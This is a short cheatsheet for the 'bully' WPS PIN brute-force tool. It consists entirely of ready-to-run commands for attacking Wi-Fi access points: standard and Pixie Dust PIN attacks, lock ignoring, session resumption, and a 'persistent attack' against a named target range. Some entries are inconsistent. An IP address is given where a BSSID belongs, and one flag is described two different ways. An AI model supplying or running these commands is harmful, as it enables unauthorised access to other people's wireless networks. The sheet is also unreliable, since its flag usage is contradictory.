# bully CHEATSHEET

## Quick Reference

### Basic Attack
```bash
bully -b AA:BB:CC:DD:EE:FF -c 6 -i wlan0mon
bully -b AA:BB:CC:DD:EE:FF -c 6 -i wlan0mon -v 3  # Verbose
```

### Pixie Dust
```bash
bully -b AA:BB:CC:DD:EE:FF -c 6 -K              # Pixie Dust
bully -b AA:BB:CC:DD:EE:FF -c 6 -K -S           # Small DH
bully -b AA:BB:CC:DD:EE:FF -c 6 -K -v 3         # Verbose
```

### Options
```bash
-t 10              # Timeout (seconds)
-n 50              # Max attempts
-s                 # Sequential PINs only
-p                 # Use P1-P2 method
-L                 # Ignore locks
-d 5               # PIN delay
```

### Session Management
```bash
bully -b BSSID -c CHANNEL -s session_file    # Save
bully -b BSSID -c CHANNEL -r session_file    # Resume
```

---

## Target: 192.168.1.x

```bash
# Quick WPS test
bully -b 192.168.1.1 -c 6 -K -v 3

# Persistent attack
bully -b 192.168.1.1 -c 6 -s session -n 100 -L
```
